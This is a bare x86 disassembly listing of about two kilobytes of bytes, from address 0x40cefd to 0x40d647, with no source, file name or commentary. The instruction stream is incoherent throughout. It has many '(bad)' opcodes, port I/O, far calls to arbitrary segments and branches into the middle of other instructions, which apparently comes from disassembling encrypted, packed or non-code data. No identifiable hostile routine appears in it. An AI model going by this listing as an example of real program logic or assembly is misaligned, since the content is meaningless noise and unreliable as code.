  40cefd:	cmp    BYTE PTR [ecx],bl
  40ceff:	sub    esi,0x8
  40cf02:	mov    esp,0x3a6c4ff
  40cf07:	test   BYTE PTR [esp+ebp*8+0x7b3f10e5],bh
  40cf0e:	es mov ebx,0xc90ae360
  40cf14:	(bad)  
  40cf16:	sbb    BYTE PTR [ecx+0x5bc0fae9],dl
  40cf1c:	out    dx,eax
  40cf1d:	push   0xb093e9eb
  40cf22:	push   0xffffffaf
  40cf24:	(bad)  
  40cf25:	das    
  40cf26:	pop    ebx
  40cf27:	cmp    ch,BYTE PTR [edx]
  40cf29:	(bad)  
  40cf2a:	push   cs
  40cf2b:	cmp    eax,0x85911eda
  40cf30:	(bad)  
  40cf31:	xor    DWORD PTR [ebx-0x6c],esp
  40cf34:	add    cl,cl
  40cf36:	daa    
  40cf37:	dec    ecx
  40cf38:	nop
  40cf39:	jl     0x40cf27
  40cf3b:	or     BYTE PTR [eax+0x59],al
  40cf3e:	pop    ebx
  40cf3f:	mov    al,0xec
  40cf41:	in     al,0xd6
  40cf43:	pop    ebx
  40cf44:	xlat   BYTE PTR ds:[ebx]
  40cf45:	xor    DWORD PTR [edi-0x71],edi
  40cf48:	add    al,0x26
  40cf4a:	sub    cl,BYTE PTR [edi]
  40cf4c:	ds push ebp
  40cf4e:	dec    esi
  40cf4f:	imul   eax,DWORD PTR [ecx-0x5b],0x79
  40cf53:	fld    TBYTE PTR [esi+eiz*8+0xc]
  40cf57:	mov    dh,0x83
  40cf59:	(bad)  
  40cf5a:	test   eax,0x74d7206e
  40cf5f:	jne    0x40cf80
  40cf61:	int    0x66
  40cf63:	and    dl,BYTE PTR [edx]
  40cf65:	cdq    
  40cf66:	fisubr DWORD PTR [ecx+0x64]
  40cf69:	xchg   ebx,edi
  40cf6b:	jecxz  0x40cf2b
  40cf6d:	sbb    esp,DWORD PTR [edx-0x7eed047e]
  40cf73:	add    DWORD PTR [esi+0x51955ba7],edx
  40cf79:	pop    eax
  40cf7a:	pop    edx
  40cf7b:	fadd   QWORD PTR [edi-0x54]
  40cf7e:	xchg   ecx,eax
  40cf7f:	xchg   edx,eax
  40cf80:	push   ds
  40cf81:	dec    edi
  40cf82:	stc    
  40cf83:	test   BYTE PTR [ecx],bh
  40cf85:	das    
  40cf86:	or     BYTE PTR [edx],cl
  40cf88:	ds sbb eax,0x3b29b6b5
  40cf8e:	retf   
  40cf8f:	pop    ds
  40cf90:	mov    dh,0x97
  40cf92:	pop    ebx
  40cf93:	pop    ds
  40cf94:	fs std 
  40cf96:	cdq    
  40cf97:	test   bl,cl
  40cf99:	jp     0x40cfbe
  40cf9b:	aad    0x3f
  40cf9d:	and    eax,0x38750727
  40cfa2:	stos   BYTE PTR es:[edi],al
  40cfa3:	in     eax,0x94
  40cfa5:	push   ds
  40cfa6:	aaa    
  40cfa7:	div    DWORD PTR [eax]
  40cfa9:	sbb    BYTE PTR [edi-0x678b4068],0x2c
  40cfb0:	lods   al,BYTE PTR ds:[esi]
  40cfb1:	and    al,BYTE PTR ds:0x54ec9cc0
  40cfb7:	fdivr  DWORD PTR [ebp+0x50]
  40cfba:	daa    
  40cfbb:	repnz mov ecx,0x913851b
  40cfc1:	dec    ebp
  40cfc2:	mov    ebx,0xb32d1a34
  40cfc7:	hlt    
  40cfc8:	mov    cl,0x5b
  40cfca:	pop    ebx
  40cfcb:	inc    ecx
  40cfcc:	shl    bl,cl
  40cfce:	mov    cl,0x5b
  40cfd0:	stos   DWORD PTR es:[edi],eax
  40cfd1:	or     edx,ebp
  40cfd3:	adc    al,0xce
  40cfd5:	(bad)  
  40cfd6:	pop    ebx
  40cfd7:	fsubr  st,st(4)
  40cfd9:	std    
  40cfda:	sbb    al,0x18
  40cfdc:	shl    BYTE PTR [eax],cl
  40cfde:	sub    BYTE PTR [ebp-0x555e87ee],al
  40cfe4:	aas    
  40cfe5:	sbb    DWORD PTR [ebx+0x2e],eax
  40cfe8:	mov    DWORD PTR [esi+esi*1-0x6f19fdf2],edi
  40cfef:	xchg   edx,eax
  40cff0:	dec    edi
  40cff1:	or     bh,BYTE PTR [esi+eax*8-0x21]
  40cff5:	inc    ecx
  40cff6:	push   cs
  40cff7:	ds mov bx,0x36a3
  40cffc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cffd:	dec    ebp
  40cffe:	or     eax,DWORD PTR [edi+0x61]
  40d001:	out    0x56,al
  40d003:	ja     0x40cf8f
  40d005:	add    BYTE PTR [edi],ah
  40d007:	mov    al,0xcf
  40d009:	stos   BYTE PTR es:[edi],al
  40d00a:	pusha  
  40d00b:	push   eax
  40d00c:	dec    ebx
  40d00d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d00e:	push   eax
  40d00f:	xor    al,0x3f
  40d011:	mov    esp,0xe78d0f5d
  40d016:	(bad)  
  40d017:	das    
  40d018:	arpl   WORD PTR [esi+0x78],sp
  40d01b:	sub    WORD PTR [esi-0x7e],0xff87
  40d020:	fisub  WORD PTR [esi-0x41]
  40d023:	sbb    BYTE PTR [ebx],cl
  40d025:	xchg   ecx,eax
  40d026:	pop    ebx
  40d027:	push   esp
  40d028:	xor    eax,0x4cfbcb08
  40d02d:	ret    0x8577
  40d030:	aam    0x53
  40d032:	add    al,0x7c
  40d034:	idiv   BYTE PTR [edx+0x4b6fa753]
  40d03a:	push   0xffffff97
  40d03c:	cmp    eax,0x66e9b80b
  40d041:	adc    BYTE PTR [esi],0xee
  40d044:	xchg   BYTE PTR [edx],bl
  40d046:	cld    
  40d047:	xchg   ebx,eax
  40d048:	(bad)  
  40d049:	das    
  40d04a:	dec    esi
  40d04b:	test   DWORD PTR [ebx-0x46],edx
  40d04e:	cdq    
  40d04f:	xor    edx,eax
  40d051:	add    al,0xa5
  40d053:	add    al,0xb5
  40d055:	pop    ebp
  40d056:	pop    ebx
  40d057:	(bad)  
  40d058:	out    dx,eax
  40d059:	or     eax,0xe52878d2
  40d05e:	cmp    al,BYTE PTR [eax-0x499228ef]
  40d064:	sahf   
  40d065:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d066:	fisub  DWORD PTR [edi-0xd]
  40d069:	adc    eax,0x9402625b
  40d06e:	test   BYTE PTR [ecx+0x30],bl
  40d071:	adc    BYTE PTR es:[ebp+0x198bd720],al
  40d078:	aas    
  40d079:	jae    0x40d0b4
  40d07b:	xor    al,0xdd
  40d07d:	sbb    ebx,eax
  40d07f:	shr    BYTE PTR [esi-0x1a],0x2a
  40d083:	xchg   edx,eax
  40d084:	push   edi
  40d085:	int    0x2f
  40d087:	mov    edx,fs
  40d089:	or     ah,BYTE PTR [esi]
  40d08b:	mov    ds:0x5b4ce9,al
  40d090:	cmp    BYTE PTR [ebx],bl
  40d092:	aam    0x3b
  40d094:	hlt    
  40d095:	out    0x60,eax
  40d097:	jne    0x40d020
  40d099:	adc    al,0xe3
  40d09b:	mov    WORD PTR [esi+0x6a2dd7cf],fs
  40d0a1:	lock pop edx
  40d0a3:	push   cs
  40d0a4:	xchg   ecx,eax
  40d0a5:	inc    eax
  40d0a6:	or     DWORD PTR [ecx+0x60],ebx
  40d0a9:	cmp    esi,DWORD PTR [esi-0x7d3b4067]
  40d0af:	mov    esp,0x461b94fa
  40d0b4:	cmp    cl,BYTE PTR [ebp+0x46]
  40d0b7:	pusha  
  40d0b8:	jne    0x40d108
  40d0ba:	or     BYTE PTR [eax+ebx*1-0x5],al
  40d0be:	mov    al,ds:0x77e00907
  40d0c3:	xchg   esp,eax
  40d0c4:	int    0x67
  40d0c6:	adc    al,0xb6
  40d0c8:	mov    esp,0x5fcd18ec
  40d0cd:	je     0x40d12a
  40d0cf:	sub    BYTE PTR [ecx],bl
  40d0d1:	call   0xfbdb:0x756db01
  40d0d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d0d9:	dec    edi
  40d0da:	pop    edx
  40d0db:	imul   edi,DWORD PTR [eax-0x70],0xd60a0d12
  40d0e2:	pop    edx
  40d0e3:	add    bl,ch
  40d0e5:	cs mov dl,0x63
  40d0e8:	push   es
  40d0e9:	push   ebx
  40d0ea:	jae    0x40d070
  40d0ec:	(bad)  
  40d0ed:	sar    DWORD PTR [edx],1
  40d0ef:	sar    DWORD PTR [esi],cl
  40d0f1:	jnp    0x40d142
  40d0f3:	fbstp  TBYTE PTR [edx]
  40d0f5:	lock sahf 
  40d0f7:	jnp    0x40d0cc
  40d0f9:	out    0xba,eax
  40d0fb:	fucomip st,st(0)
  40d0fd:	fld    QWORD PTR ss:0xa3ac9de0
  40d104:	sub    bl,BYTE PTR [ebx+ebx*2+0x12a987b6]
  40d10b:	sub    al,0x88
  40d10d:	xor    eax,0x408c85d6
  40d112:	and    ch,BYTE PTR [esi-0x2907e6c1]
  40d118:	add    BYTE PTR [edx-0x6ddcda40],0x54
  40d11f:	sbb    edi,DWORD PTR [edi]
  40d121:	shr    BYTE PTR [ebx+0x3721a50e],1
  40d127:	gs aas 
  40d129:	stos   DWORD PTR es:[edi],eax
  40d12a:	aas    
  40d12b:	imul   esp,DWORD PTR [ebx+0x78],0xffffffc6
  40d12f:	(bad)  
  40d130:	scas   eax,DWORD PTR es:[edi]
  40d131:	out    0xc0,eax
  40d133:	arpl   si,di
  40d135:	ficomp WORD PTR [ebx-0x7da4d798]
  40d13b:	push   ecx
  40d13c:	aas    
  40d13d:	out    0x29,al
  40d13f:	out    dx,al
  40d140:	push   0xde6cc374
  40d145:	in     al,0xd6
  40d147:	aas    
  40d148:	sbb    BYTE PTR [edi-0x24],bl
  40d14b:	push   ds
  40d14c:	inc    ecx
  40d14d:	aaa    
  40d14e:	adc    DWORD PTR [ecx],edi
  40d150:	ds out dx,eax
  40d152:	push   edi
  40d153:	jg     0x40d126
  40d155:	xchg   ebp,eax
  40d156:	xor    eax,0xfce38d53
  40d15b:	out    0x38,al
  40d15d:	lahf   
  40d15e:	int    0x8b
  40d160:	stc    
  40d161:	mov    dh,BYTE PTR [eax-0x654b590c]
  40d167:	add    DWORD PTR [bx+si+0x5a],ecx
  40d16b:	ds ss and eax,0xc8b2eec2
  40d172:	test   BYTE PTR [ebx-0x7aab2610],ch
  40d178:	in     al,dx
  40d179:	inc    ebx
  40d17a:	mov    dh,0x98
  40d17c:	cmp    BYTE PTR [edi-0x3b8a4e45],ch
  40d182:	cmp    al,0xd8
  40d184:	jg     0x40d18d
  40d186:	sbb    al,0xd4
  40d188:	mov    edx,0x5985c174
  40d18d:	js     0x40d167
  40d18f:	mov    eax,0xf17b147
  40d194:	das    
  40d195:	sbb    esp,DWORD PTR [esi]
  40d197:	test   DWORD PTR [ebp-0x9c47023],eax
  40d19d:	lods   al,BYTE PTR ds:[esi]
  40d19e:	dec    ebx
  40d19f:	test   DWORD PTR [edi+0x3e615888],edi
  40d1a5:	jnp    0x40d13c
  40d1a7:	pop    ebp
  40d1a8:	jmp    0x6df:0x8f3b9b11
  40d1af:	jp     0x40d1eb
  40d1b1:	popf   
  40d1b2:	iret   
  40d1b3:	stc    
  40d1b4:	xchg   edx,eax
  40d1b5:	and    edx,DWORD PTR [esp+ecx*4-0x7c]
  40d1b9:	mov    BYTE PTR [ebx],ch
  40d1bb:	test   BYTE PTR [eax+0x65],cl
  40d1be:	dec    eax
  40d1bf:	xor    al,ch
  40d1c1:	jae    0x40d224
  40d1c3:	cdq    
  40d1c4:	xchg   edx,eax
  40d1c5:	mov    dh,0xa4
  40d1c7:	les    edi,FWORD PTR [ebx]
  40d1c9:	out    0xbe,eax
  40d1cb:	int3   
  40d1cc:	dec    esi
  40d1cd:	jmp    DWORD PTR [esi+0x5c]
  40d1d0:	cmp    al,0xde
  40d1d2:	imul   ebx,esi,0xf65b238d
  40d1d8:	adc    bl,BYTE PTR [eax*1-0x46801b95]
  40d1df:	test   BYTE PTR [ecx-0x3627e4b1],cl
  40d1e5:	mov    bl,0xc3
  40d1e7:	add    BYTE PTR [esi+0x7e0a558c],bh
  40d1ed:	outs   dx,DWORD PTR ds:[esi]
  40d1ee:	mov    ebp,0x68e07bdb
  40d1f3:	sar    al,cl
  40d1f5:	loopne 0x40d26b
  40d1f7:	xor    al,0xdf
  40d1f9:	sub    al,BYTE PTR [eax-0x37]
  40d1fc:	aas    
  40d1fd:	adc    eax,0xeb7a00f
  40d202:	sbb    al,0x79
  40d204:	inc    eax
  40d205:	out    0xe0,al
  40d207:	push   es
  40d208:	repz xchg edx,eax
  40d20a:	xchg   edx,eax
  40d20b:	lods   eax,DWORD PTR ds:[esi]
  40d20c:	push   esp
  40d20d:	jbe    0x40d24d
  40d20f:	cdq    
  40d210:	popf   
  40d211:	push   ebp
  40d212:	fs cmp al,0x71
  40d215:	ds pop eax
  40d217:	(bad)  
  40d218:	pop    esi
  40d219:	sub    DWORD PTR [ebx],eax
  40d21b:	lahf   
  40d21c:	fsubr  QWORD PTR [edi+0x1e49843a]
  40d222:	popa   
  40d223:	shl    bl,1
  40d225:	inc    esi
  40d226:	cmp    al,0xf9
  40d228:	or     al,0xb
  40d22a:	pop    edx
  40d22b:	sub    bl,bh
  40d22d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d22e:	cmp    DWORD PTR [edi-0x79019cf6],0x4f54f35d
  40d238:	fild   WORD PTR ds:0xce956cbc
  40d23e:	pop    ebx
  40d23f:	(bad)  
  40d240:	fimul  DWORD PTR [esi]
  40d242:	loop   0x40d2a0
  40d244:	ss dec edi
  40d246:	jns    0x40d1cc
  40d248:	mov    ah,BYTE PTR [esi-0x55]
  40d24b:	mov    bl,0x3e
  40d24d:	(bad)  
  40d24f:	sbb    eax,0xff8944df
  40d254:	xchg   esp,eax
  40d255:	out    0xc6,eax
  40d257:	nop
  40d258:	mov    ecx,0x7e70c141
  40d25d:	call   0xd6a2:0x68f6bfb8
  40d264:	inc    ebp
  40d265:	les    esp,FWORD PTR [ebx+0x68]
  40d268:	je     0x40d290
  40d26a:	fimul  DWORD PTR [ecx]
  40d26c:	lahf   
  40d26d:	out    0x22,eax
  40d26f:	xchg   ebx,eax
  40d270:	jae    0x40d2bf
  40d272:	stos   DWORD PTR es:[edi],eax
  40d273:	(bad)  
  40d274:	in     al,0x4f
  40d276:	scas   al,BYTE PTR es:[edi]
  40d277:	or     ch,0xa1
  40d27a:	inc    esi
  40d27b:	add    BYTE PTR [edx+esi*2],dh
  40d27e:	rol    BYTE PTR ds:0xb33c0d8b,cl
  40d284:	or     al,0xf7
  40d286:	retf   
  40d287:	test   DWORD PTR [edi+edx*4-0x52],esp
  40d28b:	pop    esi
  40d28c:	ds retf 
  40d28e:	aas    
  40d28f:	xor    DWORD PTR [ecx],0x5e2e6066
  40d295:	out    0x4c,al
  40d297:	mov    ah,0x9d
  40d299:	push   es
  40d29a:	lea    edx,[edi*4+0x748913c0]
  40d2a1:	push   ebp
  40d2a2:	pop    ecx
  40d2a3:	out    dx,al
  40d2a4:	mov    esp,0x7c29ed1
  40d2a9:	xchg   edx,eax
  40d2aa:	sar    BYTE PTR [ebx],cl
  40d2ac:	or     DWORD PTR ds:[ebx],0xffffffab
  40d2b0:	cli    
  40d2b1:	pop    eax
  40d2b2:	sbb    ch,bl
  40d2b4:	aas    
  40d2b5:	mov    ecx,0x5c8a5082
  40d2ba:	pop    ecx
  40d2bb:	(bad)  
  40d2bc:	das    
  40d2bd:	hlt    
  40d2be:	push   esp
  40d2bf:	cmp    al,0x6d
  40d2c1:	xchg   ebp,eax
  40d2c2:	neg    BYTE PTR [ebx+0x4e5ac519]
  40d2c8:	ds test eax,0xff2edb82
  40d2ce:	pop    ecx
  40d2cf:	mov    ch,ch
  40d2d1:	add    ebp,DWORD PTR [edi]
  40d2d3:	mov    ss,WORD PTR [esp+edi*8+0x1e]
  40d2d7:	mov    ebp,ebp
  40d2d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d2da:	sub    eax,0x70576861
  40d2df:	and    BYTE PTR [esi],bh
  40d2e1:	popa   
  40d2e2:	mov    ecx,0x5d1a30b0
  40d2e7:	mov    esp,0x3728e695
  40d2ec:	std    
  40d2ed:	test   al,0x4c
  40d2ef:	rcl    BYTE PTR [eax],1
  40d2f1:	clc    
  40d2f2:	sahf   
  40d2f3:	lods   al,BYTE PTR ds:[esi]
  40d2f4:	push   eax
  40d2f5:	cdq    
  40d2f6:	push   esp
  40d2f7:	or     dl,BYTE PTR ds:0xf7788317
  40d2fd:	xchg   BYTE PTR [edx+0x38],ah
  40d300:	sbb    bh,BYTE PTR [eax]
  40d302:	and    eax,0xd90936ba
  40d307:	cwde   
  40d308:	mov    esi,0x8a4cd50c
  40d30d:	push   esi
  40d30e:	pop    eax
  40d30f:	xchg   esi,ebp
  40d311:	pop    ebp
  40d312:	ins    DWORD PTR es:[edi],dx
  40d313:	into   
  40d314:	push   ebx
  40d315:	outs   dx,BYTE PTR ds:[esi]
  40d316:	jp     0x40d31d
  40d318:	pushf  
  40d319:	lahf   
  40d31a:	pop    ebx
  40d31b:	add    al,BYTE PTR [ecx+edi*2]
  40d31e:	sbb    ebx,DWORD PTR [edi-0x7b3a2a96]
  40d324:	rcr    BYTE PTR [ecx],0xa1
  40d327:	pop    ds
  40d328:	cmp    eax,0xffc1855f
  40d32d:	fldenv [edi+0x56]
  40d330:	jge    0x40d2bd
  40d332:	sahf   
  40d333:	xchg   ebp,eax
  40d334:	scas   eax,DWORD PTR es:[edi]
  40d335:	cmp    dl,bl
  40d337:	xor    eax,0x851bdf8a
  40d33c:	(bad)  
  40d33d:	sub    ebp,DWORD PTR [esi+0x30badafe]
  40d343:	popf   
  40d344:	add    eax,ebp
  40d346:	pop    ebp
  40d347:	mov    ds:0x849de8e3,al
  40d34c:	inc    esi
  40d34d:	cs call 0x3c6d:0xcc908803
  40d355:	sbb    al,0x16
  40d357:	and    cl,BYTE PTR [ebx-0x40bdfbea]
  40d35d:	add    eax,0x4d396867
  40d362:	and    eax,0x6f77895
  40d367:	(bad)  
  40d368:	aad    0xf0
  40d36a:	fdiv   DWORD PTR ds:0x84b0db56
  40d370:	leave  
  40d371:	pop    edx
  40d372:	call   0x1c0c:0x224ae313
  40d379:	jae    0x40d3e0
  40d37b:	js     0x40d301
  40d37d:	add    bl,BYTE PTR [ebx-0x17]
  40d380:	(bad)  
  40d382:	retf   0x925c
  40d385:	xchg   DWORD PTR fs:[ebp+0xb],edi
  40d389:	cmp    dl,dl
  40d38b:	cld    
  40d38c:	nop
  40d38d:	or     al,0x5a
  40d38f:	mov    al,ds:0x4b80bac3
  40d394:	sub    BYTE PTR [eax+0x64],dh
  40d397:	clc    
  40d398:	push   esi
  40d399:	sbb    BYTE PTR [ebx+0x8],bl
  40d39c:	repnz sti 
  40d39e:	push   cs
  40d39f:	jle    0x40d340
  40d3a1:	jb     0x40d3fd
  40d3a3:	rcr    BYTE PTR [edi],0x5
  40d3a6:	loopne 0x40d37d
  40d3a8:	loop   0x40d3c4
  40d3aa:	test   BYTE PTR cs:[edx+0x76],ch
  40d3ae:	rcl    BYTE PTR [edi+0x47],0xf
  40d3b2:	pop    ebp
  40d3b3:	or     BYTE PTR ds:0x528531ae,cl
  40d3b9:	jg     0x40d36d
  40d3bb:	xchg   edx,eax
  40d3bc:	pop    edx
  40d3bd:	imul   ch
  40d3bf:	test   esp,edi
  40d3c1:	push   0xffffff96
  40d3c3:	push   ebp
  40d3c4:	sbb    BYTE PTR [ecx],dh
  40d3c6:	aad    0xf2
  40d3c8:	or     DWORD PTR ds:[eax-0x1c],ebp
  40d3cc:	inc    edi
  40d3cd:	(bad)  
  40d3ce:	nop
  40d3cf:	jo     0x40d41f
  40d3d1:	xchg   ecx,eax
  40d3d2:	stos   BYTE PTR es:[edi],al
  40d3d3:	jb     0x40d417
  40d3d5:	fs (bad) 
  40d3d7:	ss xchg ebx,eax
  40d3d9:	add    al,0x5b
  40d3db:	and    BYTE PTR [ecx+0x1f],ch
  40d3de:	int3   
  40d3df:	fdivrp st(6),st
  40d3e1:	push   ecx
  40d3e2:	jle    0x40d3a6
  40d3e4:	je     0x40d3c6
  40d3e6:	pop    ebx
  40d3e7:	fcomp  DWORD PTR [edi-0x8]
  40d3ea:	test   al,0xea
  40d3ec:	cmp    DWORD PTR [ecx+0x20],0x11
  40d3f0:	add    BYTE PTR [edx+ebx*1+0x139b3e9d],bl
  40d3f7:	(bad)  
  40d3f8:	xchg   ebx,eax
  40d3f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d3fa:	adc    DWORD PTR ds:0xdf8e31fd,esi
  40d400:	aas    
  40d401:	cmp    eax,0x7bc65d8b
  40d406:	test   dh,bl
  40d408:	ds pop edi
  40d40a:	mov    ebx,0x5b642fac
  40d40f:	neg    DWORD PTR [eax]
  40d411:	out    0xea,al
  40d413:	enter  0xd8cc,0x70
  40d417:	cwde   
  40d418:	inc    ebp
  40d419:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d41a:	fsubrp st(6),st
  40d41c:	loop   0x40d439
  40d41e:	push   ebp
  40d41f:	out    dx,al
  40d420:	fist   WORD PTR [edi-0x1861425e]
  40d426:	(bad)  
  40d427:	ds pusha 
  40d429:	xchg   ebp,eax
  40d42a:	jno    0x40d480
  40d42c:	sbb    ecx,ebp
  40d42e:	jecxz  0x40d46b
  40d430:	jmp    0x40d452
  40d432:	popa   
  40d433:	(bad)  
  40d434:	jae    0x40d41d
  40d436:	dec    ecx
  40d437:	fild   DWORD PTR [edx]
  40d439:	and    eax,0xc7a6e7c9
  40d43e:	ror    DWORD PTR [edx+0xe8ac6e9],cl
  40d444:	nop
  40d445:	imul   eax,DWORD PTR [esi],0xffffffe8
  40d448:	stos   BYTE PTR es:[edi],al
  40d449:	xor    al,0x5a
  40d44b:	pusha  
  40d44c:	loope  0x40d3e3
  40d44e:	popf   
  40d44f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d450:	dec    eax
  40d451:	les    ebx,FWORD PTR [ebx+ebx*4+0x3f]
  40d455:	xchg   edx,eax
  40d456:	mov    ecx,0x90528c9c
  40d45b:	int    0x3f
  40d45d:	mov    ecx,0x54c305aa
  40d462:	loop   0x40d470
  40d464:	inc    esp
  40d465:	out    0x6c,eax
  40d467:	or     al,0x10
  40d469:	fisubr DWORD PTR [eax+0x5d161916]
  40d46f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d470:	enter  0x5b6d,0x6e
  40d474:	fwait
  40d475:	jge    0x40d413
  40d477:	adc    eax,0x8b575c20
  40d47c:	test   al,0x6
  40d47e:	sbb    al,0x79
  40d480:	les    edx,FWORD PTR [eax]
  40d482:	fs dec esp
  40d484:	mov    esp,0x6b245fff
  40d489:	daa    
  40d48a:	test   edi,esp
  40d48c:	add    eax,0x8a8fbedd
  40d491:	data16 add al,0x3e
  40d494:	mov    DWORD PTR [ebx+0x7a],ecx
  40d497:	aam    0x28
  40d499:	mov    ds:0xe73d3b64,eax
  40d49e:	lds    edi,FWORD PTR [ebp+0x43]
  40d4a1:	xchg   esp,eax
  40d4a2:	jle    0x40d4fe
  40d4a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d4a5:	mov    esi,0xf03e9386
  40d4aa:	scas   eax,DWORD PTR es:[edi]
  40d4ab:	hlt    
  40d4ac:	enter  0x4e45,0x1b
  40d4b0:	aad    0xb4
  40d4b2:	pop    ebp
  40d4b3:	shr    BYTE PTR [ecx-0x21db047b],1
  40d4b9:	ds mov ebp,0xc7dafc0d
  40d4bf:	cmp    bl,0xff
  40d4c2:	cmp    esi,ebx
  40d4c4:	adc    al,0x29
  40d4c6:	or     bl,bh
  40d4c8:	ja     0x40d4b0
  40d4ca:	and    eax,0x136efb16
  40d4cf:	call   0x853e:0x4d9a9fd4
  40d4d6:	pop    es
  40d4d7:	mov    eax,ds:0x6c3a4557
  40d4dc:	sub    ebp,DWORD PTR ds:[eax+0x4347a522]
  40d4e3:	bound  edi,QWORD PTR ds:0x37a2dce6
  40d4e9:	push   ecx
  40d4ea:	add    esi,DWORD PTR gs:[eax+0x4]
  40d4ee:	jno    0x40d478
  40d4f0:	out    0x2b,eax
  40d4f2:	pop    ebx
  40d4f3:	call   0xe597:0x773c8331
  40d4fa:	dec    esi
  40d4fb:	jge    0x40d4ed
  40d4fd:	dec    esi
  40d4fe:	add    ecx,ebx
  40d500:	outs   dx,BYTE PTR ds:[esi]
  40d501:	adc    al,0x89
  40d503:	push   ecx
  40d504:	outs   dx,BYTE PTR ds:[esi]
  40d505:	jb     0x40d4aa
  40d507:	in     al,0x98
  40d509:	test   BYTE PTR [edx-0x6e],bl
  40d50c:	fwait
  40d50d:	imul   edx,DWORD PTR ds:0x54660091,0xffffff84
  40d514:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d515:	jno    0x40d4ae
  40d517:	or     eax,0xea24753d
  40d51c:	jmp    0x3bb0:0xef4e52e1
  40d523:	jo     0x40d593
  40d525:	xor    al,0xb6
  40d527:	mov    dh,BYTE PTR [esi-0x5a]
  40d52a:	jmp    0xfe1a94e2
  40d52f:	xor    al,0x86
  40d531:	iret   
  40d532:	stos   BYTE PTR es:[edi],al
  40d533:	add    dl,0x61
  40d536:	in     al,dx
  40d537:	test   DWORD PTR [ebx+0x37],ebx
  40d53a:	shr    cl,1
  40d53c:	or     al,0x2a
  40d53e:	fmulp  st(5),st
  40d540:	and    BYTE PTR [esi+0x59],ah
  40d543:	test   BYTE PTR [ebx],bl
  40d545:	pushf  
  40d546:	adc    edi,0x5c
  40d549:	jae    0x40d590
  40d54b:	push   ds
  40d54c:	aas    
  40d54d:	sbb    DWORD PTR [ecx+0x5e588e7f],0xa1f2ca36
  40d557:	test   DWORD PTR [ebp+0x3e8d6991],edx
  40d55d:	dec    ebp
  40d55e:	xor    eax,0x70f9c834
  40d563:	xor    BYTE PTR [ecx-0x18],ah
  40d566:	ror    DWORD PTR fs:[ebp+0x45],cl
  40d56a:	mov    ebx,0xd75e7817
  40d56f:	and    al,0x3e
  40d571:	daa    
  40d572:	cmp    DWORD PTR [ebx+0x3a],esp
  40d575:	pop    ebp
  40d576:	loope  0x40d514
  40d578:	pop    esp
  40d579:	icebp  
  40d57a:	mov    ah,0xdf
  40d57c:	push   esi
  40d57d:	lea    edi,[edx]
  40d57f:	mov    ebx,ecx
  40d581:	and    bl,BYTE PTR [ebx-0x46]
  40d584:	and    esp,DWORD PTR ds:[eax]
  40d587:	arpl   cx,di
  40d589:	jbe    0x40d5dd
  40d58b:	pop    edi
  40d58c:	mov    al,0xde
  40d58e:	out    0x9c,al
  40d590:	inc    edi
  40d591:	jno    0x40d59e
  40d593:	jp     0x40d5d4
  40d595:	xor    al,0xc8
  40d597:	jmp    0x40d584
  40d599:	jge    0x40d5ff
  40d59b:	xchg   esp,eax
  40d59c:	jg     0x40d5d2
  40d59e:	pop    ebx
  40d59f:	xchg   ch,cl
  40d5a1:	iret   
  40d5a2:	(bad)  [ecx]
  40d5a4:	aam    0x63
  40d5a6:	test   DWORD PTR cs:[ecx+ebp*2],edx
  40d5aa:	push   ds
  40d5ab:	out    dx,al
  40d5ac:	cmp    BYTE PTR [edi],ah
  40d5ae:	pop    ds
  40d5af:	jno    0x40d58f
  40d5b1:	pushf  
  40d5b2:	or     eax,0x5e896b7f
  40d5b7:	mov    ah,0x4
  40d5b9:	je     0x40d5c8
  40d5bb:	test   bh,dh
  40d5bd:	nop
  40d5be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d5bf:	das    
  40d5c0:	ds inc edi
  40d5c2:	jecxz  0x40d5ee
  40d5c4:	sub    dl,BYTE PTR [eax+edx*1]
  40d5c7:	(bad)  
  40d5c8:	jbe    0x40d5b8
  40d5ca:	outs   dx,BYTE PTR ds:[esi]
  40d5cb:	mov    DWORD PTR [edi-0x4],0xa883122d
  40d5d2:	ror    BYTE PTR [ebx-0x58ad4c47],0x5b
  40d5d9:	sub    ebp,DWORD PTR [esi+0x5a964c0c]
  40d5df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d5e0:	lods   al,BYTE PTR ds:[esi]
  40d5e1:	cmp    BYTE PTR [esi],dl
  40d5e3:	neg    BYTE PTR [edx+ecx*2+0x1e8d8587]
  40d5ea:	fiadd  WORD PTR [edx]
  40d5ec:	cmp    al,0x7f
  40d5ee:	fisubr WORD PTR [ecx]
  40d5f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d5f1:	and    DWORD PTR [esi+0x6830e6d3],0xd4389e24
  40d5fb:	test   edx,esi
  40d5fd:	into   
  40d5fe:	jge    0x40d5c2
  40d600:	push   es
  40d601:	add    eax,0x2ebf7598
  40d606:	xchg   esp,eax
  40d607:	arpl   WORD PTR [eax-0x6d],dx
  40d60a:	fcmovnu st,st(2)
  40d60c:	mov    dl,0x1d
  40d60e:	ret    
  40d60f:	mov    edx,esi
  40d611:	push   0xdac6a06c
  40d616:	test   WORD PTR [edi],di
  40d619:	imul   ebx,DWORD PTR [edx],0x3b7ab714
  40d61f:	pushf  
  40d620:	shr    ch,0xc4
  40d623:	sbb    BYTE PTR [ecx-0x67200226],bh
  40d629:	push   eax
  40d62a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d62b:	xchg   DWORD PTR [esi],esi
  40d62d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d62e:	call   0x273c1492
  40d633:	jge    0x40d60f
  40d635:	jne    0x40d646
  40d637:	call   0x9e49bcb2
  40d63c:	retf   0x6520
  40d63f:	xor    edx,DWORD PTR [edi]
  40d641:	add    edx,DWORD PTR [ecx-0x6f]
  40d644:	in     al,0x5d
  40d646:	inc    esp
  40d647:	push   ss
